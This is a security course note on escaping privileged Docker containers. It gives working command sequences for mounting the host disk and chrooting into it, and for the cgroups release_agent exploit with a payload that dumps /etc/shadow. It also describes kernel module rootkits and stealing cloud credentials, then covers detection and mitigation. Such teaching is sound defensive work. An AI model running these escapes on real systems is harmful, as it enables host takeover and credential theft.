---
tags: [docker, privileged, container-escape, cgroups, linux, rootkit]
difficulty: advanced
module: "38 - Container and Kubernetes Security"
topic: "38.04 Privileged Escape"
---

# 04 - Container Escape — Privileged Container

## Introduction

In Docker, the `--privileged` flag is the ultimate security override switch. When a container is started with `docker run --privileged`, Docker essentially disables all of the carefully constructed security isolation mechanisms that make containers secure boundaries. A privileged container is automatically granted all Linux kernel capabilities (including the dangerous `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_MODULE`), is allowed raw read/write access to all host devices in `/dev`, and has its AppArmor and seccomp profiles completely disabled.

Originally designed for specific, highly-trusted use cases like running Docker-in-Docker (DinD), hardware management agents, or intensive network manipulation tools, the `--privileged` flag is frequently abused by developers to quickly bypass annoying permission issues during development. Shockingly, these configurations often make their way into production, resulting in containers running with massive, unnecessary over-entitlement.

From an offensive perspective, breaking out of a privileged container is trivial. Because the container has full access to host block devices, cgroups, and all kernel capabilities, an attacker can easily manipulate the host's filesystem, memory, or kernel to achieve a full host compromise.

## Understanding the Attack Surface

When you land inside a container shell, the first step is to verify if it is running in privileged mode. You can determine this by checking the available capabilities, the seccomp status, and the device access.

```bash
# Check for a large number of capabilities, specifically looking for CAP_SYS_ADMIN
cat /proc/1/status | grep CapEff
# You can decode the hex mask using capsh:
capsh --decode=0000003fffffffff

# Or use capsh directly if available
capsh --print

# Check if you have access to raw host disk devices
ls -la /dev | grep sd
ls -la /dev | grep nvme
```
If you see devices like `/dev/sda`, `/dev/sda1`, `/dev/vda1`, or `/dev/nvme0n1`, and you possess `CAP_SYS_ADMIN`, you are in a privileged container and escape is guaranteed.

### Attack Architecture Diagram

```text
+--------------------------------------------------------------------------------+
|                              HOST OPERATING SYSTEM                             |
|                                                                                |
|  +--------------------------------------------------------------------------+  |
|  |                         PRIVILEGED CONTAINER                             |  |
|  |  [ ] Seccomp Disabled            [ ] AppArmor Disabled                   |  |
|  |  [X] CAP_SYS_ADMIN               [X] All Devices (/dev/*) Accessible     |  |
|  |                                                                          |  |
|  |  +---------------------------+       +--------------------------------+  |  |
|  |  | Technique 1: Disk Mount   |       | Technique 2: cgroups release   |  |  |
|  |  |                           |       |                                |  |  |
|  |  | $ mount /dev/sda1 /mnt    |       | $ echo payload > release_agent |  |  |
|  |  | $ chroot /mnt             |       | (Kernel executes on host)      |  |  |
|  |  +---------------------------+       +--------------------------------+  |  |
|  +----------------|--------------------------------------|------------------+  |
|                   |                                      |                     |
|                   v                                      v                     |
|  +--------------------------------+       +--------------------------------+   |
|  |       Host Root Filesystem     |       |          Host Kernel           |   |
|  |       (/etc/shadow, ~/.ssh)    |       |  (Executes payload as root)    |   |
|  +--------------------------------+       +--------------------------------+   |
+--------------------------------------------------------------------------------+
```

## Exploitation Techniques

### Technique 1: Mounting Host Disk Devices

The simplest and most reliable way to escape a privileged container is to directly mount the host's underlying storage device. Because the container has access to `/dev` and possesses `CAP_SYS_ADMIN` (which allows the execution of the `mount` syscall), you can just mount the host's primary partition into the container's filesystem.

1. **Identify the Host Drive:** Use `fdisk` or `lsblk` to find the primary host partition. Usually, it is `/dev/sda1`, `/dev/vda1`, or `/dev/nvme0n1p1`.
   ```bash
   fdisk -l
   # Look for the largest Linux filesystem partition
   ```
2. **Mount the Device:** Create a mount point and mount the identified device.
   ```bash
   mkdir /mnt/host_disk
   mount /dev/sda1 /mnt/host_disk
   ```
3. **Execute the Breakout:** You now have full read/write access to the host's root filesystem. You can dump `/mnt/host_disk/etc/shadow`, write a reverse shell payload to `/mnt/host_disk/etc/crontab`, or simply use `chroot` to drop into a host shell context.
   ```bash
   chroot /mnt/host_disk /bin/bash
   ```

### Technique 2: The cgroups `release_agent` Exploit

If mounting the disk device is not possible (e.g., specific hypervisor configurations, rootless storage drivers, or lack of `fdisk`), the `release_agent` feature of Linux cgroups provides a highly reliable alternative. This technique was popularized by Felix Wilhelm.

The `release_agent` is a kernel feature that executes a specified script or command when all processes in a cgroup terminate. Crucially, the kernel executes this `release_agent` script **from the host's perspective**, meaning it runs outside the container's namespaces and with full host root privileges.

**Prerequisites:** You need `CAP_SYS_ADMIN` to mount the cgroup filesystem.

**Exploitation Steps:**

1. **Mount the RDMA cgroup controller:** (You can use other controllers like `memory` or `cpu`, but `rdma` is rarely used and avoids conflicts with existing container resource limits).
   ```bash
   mkdir /tmp/cgrp
   mount -t cgroup -o rdma cgroup /tmp/cgrp
   ```
2. **Create a child cgroup:**
   ```bash
   mkdir /tmp/cgrp/x
   ```
3. **Enable `notify_on_release`:** This flag tells the kernel to trigger the `release_agent` when this specific cgroup becomes empty.
   ```bash
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```
4. **Set the `release_agent` path:** We must give the kernel the path to our payload. However, the kernel evaluates this path from the *host's* filesystem namespace. We need to find the absolute path of our container on the host. We can extract this by reading `/etc/mtab`.
   ```bash
   host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
   ```
5. **Create the payload:** Create the script that the kernel will execute. In this example, we dump the host's `/etc/shadow` file into our container's `/output` directory.
   ```bash
   echo '#!/bin/sh' > /cmd
   echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
   chmod +x /cmd
   ```
6. **Trigger the execution:** We trigger the `release_agent` by launching a brief process inside our child cgroup. When the process dies immediately, the cgroup becomes empty, and the kernel executes `/cmd` as host root.
   ```bash
   sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
   ```
7. **Read the result:**
   ```bash
   cat /output
   ```

### Technique 3: Kernel Module Injection

Because a privileged container possesses `CAP_SYS_MODULE`, an attacker can compile a malicious Linux kernel module (`.ko`), upload it to the container, and use `insmod` to load it directly into the host's kernel space. This allows for the installation of stealthy rootkits, network hooking, bypassing of eBPF monitoring, and complete system subversion at Ring 0, bypassing all user-land security controls completely.

## Detection and Mitigation

### Detection
- **Auditd/eBPF:** Monitor for unusual `mount` syscalls inside containers, especially those mounting block devices like `/dev/sda` or attempting to mount `cgroup` controllers.
- **cgroups Monitoring:** Alert on modifications to any `release_agent` file or the `notify_on_release` flag within containerized environments. These files should almost never be touched by applications.
- **Capability Monitoring:** Track processes executing with `CAP_SYS_ADMIN` using tools like Falco or Tetragon, and alert if unauthorized shells are spawned.

### Mitigation
1. **Never use `--privileged` in production:** This is the golden rule of container security. There is rarely a valid reason for an application to require full privileges.
2. **Principle of Least Privilege (Capabilities):** If a container requires a specific permission, add *only* that individual capability using `--cap-add`, rather than using the blanket `--privileged` flag. For example, if network management is needed, use `--cap-add=NET_ADMIN`.
3. **Kubernetes Pod Security Standards (PSS):** In Kubernetes environments, enforce the "Restricted" or "Baseline" Pod Security Standards via Admission Controllers to strictly forbid the deployment of privileged pods at the cluster level.
4. **AppArmor / Seccomp Profiles:** Ensure default security profiles are strictly enforced. Privileged mode completely strips these away; using fine-grained capabilities allows these critical profiles to remain active.

## Chaining Opportunities
- **Application RCE -> Kernel Exploit:** Landing in a privileged container provides the perfect staging ground to launch advanced kernel exploits that require raw socket access, large memory allocations, or high capabilities.
- **Privileged Container -> Cloud Instance Takeover:** Escaping the container allows the attacker to harvest cloud metadata service credentials (AWS IMDSv1/v2) from the host network namespace, leading to cloud account compromise.

## Related Notes
- [[01 - Docker Overview — Images, Containers, Registries]]
- [[03 - Docker Socket Mount Privilege Escalation]]
- [[05 - Container Escape — Mounted Host Filesystem]]
- [[06 - Container Escape — SYS_PTRACE Capability]]
